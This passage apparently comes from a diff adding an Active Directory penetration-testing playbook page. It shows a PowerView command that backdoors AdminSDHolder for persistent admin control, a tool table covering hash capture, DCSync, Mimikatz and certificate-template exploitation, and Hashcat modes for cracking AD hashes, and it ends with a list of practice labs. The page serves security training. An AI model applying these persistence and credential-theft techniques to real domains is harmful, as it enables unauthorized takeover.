+          <button class="btn-copy" onclick="copyCode(this)">Copy</button>
+          <pre><span class="fn">Add-DomainObjectAcl</span> <span class="kw">-TargetIdentity</span> <span class="st">"CN=AdminSDHolder,CN=System,DC=corp,DC=local"</span> <span class="kw">-PrincipalIdentity</span> jsmith <span class="kw">-Rights</span> All</pre>
+        </div>
+        <div class="details-box">
+          <strong>Domain Context:</strong> Adding your user account with <code>All</code> rights to AdminSDHolder ensures that even if you are removed from the Domain Admins group, SDProp will restore full control over all administrative accounts within an hour.
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== TOOLS SECTION ==================== -->
+    <section id="sect-tools" class="playbook-section">
+      <h2>🔧 Key Toolsets</h2>
+      <p class="section-intro">Reference index of active directory penetration testing utilities.</p>
+
+      <div class="info-card">
+        <div class="card-title">AD Penetration Testing Utilities</div>
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>Tool Name</th>
+              <th>Primary Purpose</th>
+              <th>Key Use Cases</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>NetExec (nxc)</strong></td>
+              <td>Multi-protocol network sweep</td>
+              <td>Password spraying, null session checks, share enumeration, local command execution</td>
+            </tr>
+            <tr>
+              <td><strong>Responder</strong></td>
+              <td>Broadcast poisoning</td>
+              <td>Poisoning LLMNR/NBT-NS/mDNS queries to collect NetNTLM hashes</td>
+            </tr>
+            <tr>
+              <td><strong>Impacket</strong></td>
+              <td>Protocol library &amp; script suite</td>
+              <td>GetUserSPNs (Kerberoasting), GetNPUsers (AS-REP Roasting), secretsdump (DCSync), wmiexec (PtH)</td>
+            </tr>
+            <tr>
+              <td><strong>BloodHound</strong></td>
+              <td>Graph-theory path analyzer</td>
+              <td>Mapping group memberships, active sessions, and DACLs to find shortest paths to Domain Admin</td>
+            </tr>
+            <tr>
+              <td><strong>Mimikatz</strong></td>
+              <td>LSASS memory manipulation</td>
+              <td>Extracting plaintext credentials, dumping hashes, passing tickets, forging golden tickets</td>
+            </tr>
+            <tr>
+              <td><strong>Rubeus</strong></td>
+              <td>Kerberos interaction toolkit</td>
+              <td>Requesting tickets, ticket injection (PtT), AS-REP/Kerberoasting on Windows hosts</td>
+            </tr>
+            <tr>
+              <td><strong>Certipy</strong></td>
+              <td>Active Directory Certificate Services</td>
+              <td>Discovering and exploiting vulnerable CA templates (ESC1 - ESC13)</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="info-card">
+        <div class="card-title">Hashcat AD Mode Reference</div>
+        <p class="card-text">Quick reference for password cracking modes during Active Directory audits:</p>
+        <pre>
+-m 1000   -> NTLM (SAM & NTDS.dit database hashes)
+-m 5600   -> NetNTLMv2 (Captured via broadcast poisoning or SMB relays)
+-m 13100  -> Kerberos TGS-REP (Kerberoasting - RC4 encryption)
+-m 19700  -> Kerberos TGS-REP (Kerberoasting - AES-256 encryption)
+-m 18200  -> Kerberos AS-REP (AS-REP Roasting)
+        </pre>
+      </div>
+    </section>
+
+    <!-- ==================== LABS SECTION ==================== -->
+    <section id="sect-labs" class="playbook-section">
+      <h2>🧪 Lab Environments</h2>
+      <p class="section-intro">Recommended lab platforms to practice and test Active Directory attack techniques legally.</p>
+
+      <div class="info-card">
+        <div class="card-title">Vulnerable Platforms</div>
+        <p class="card-text">Practice these concepts in legal, self-hosted, or online lab environments:</p>
+        
+        <div class="details-box">
+          <strong>1. Game of Active Directory (GOAD):</strong> 
+          <p style="margin-top: 0.25rem;">An open-source multi-domain home lab containing 5 virtual machines. It is highly recommended for self-hosting via Vagrant/VirtualBox to practice cross-forest trusts, ADCS templates, and delegation paths.</p>
+        </div>
+
+        <div class="details-box" style="border-left-color: var(--purple-accent);">
+          <strong>2. TryHackMe Active Directory Rooms:</strong> 
+          <p style="margin-top: 0.25rem;">Guided walkthrough rooms (e.g., "Breaching AD", "Attacking Active Directory"). Ideal for beginners practicing basic enumeration, Kerbrute, and BloodHound logic.</p>
+        </div>
+
+        <div class="details-box" style="border-left-color: var(--coral-alert);">
+          <strong>3. HackTheBox Pro Labs &amp; Machines:</strong> 
+          <p style="margin-top: 0.25rem;">Enterprise-scale simulated networks (e.g., Cybernetics, Offshore, APTLabs). Features complex trust relationships, forest-wide escalations, and evasion tactics.</p>
+        </div>
+      </div>
+      </section>
+
+      <!-- Footer Area -->
+      <footer class="footer-area">
+        <p>&copy; 2026 Deepanshu. All rights reserved.</p>
+      </footer>
+
+    </div>
+  </div> 
+  <div class="top-scroller" id="back-top" onclick="scrollToTop()">↑</div>
+
+  <!-- Link script file -->
+  <script src="scripts.js"></script>
+</body>
+</html>
